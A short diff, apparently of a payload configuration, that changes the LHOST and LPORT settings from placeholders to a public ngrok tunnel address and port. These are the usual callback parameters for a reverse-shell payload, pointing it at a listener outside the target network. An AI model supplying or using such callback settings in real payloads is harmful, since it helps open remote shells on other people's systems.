@@ -1,3 +1,3 @@
-LHOST: listener
-LPORT: portador diario
+LHOST: 0.tcp.ngrok.io
+LPORT: 13789
 End
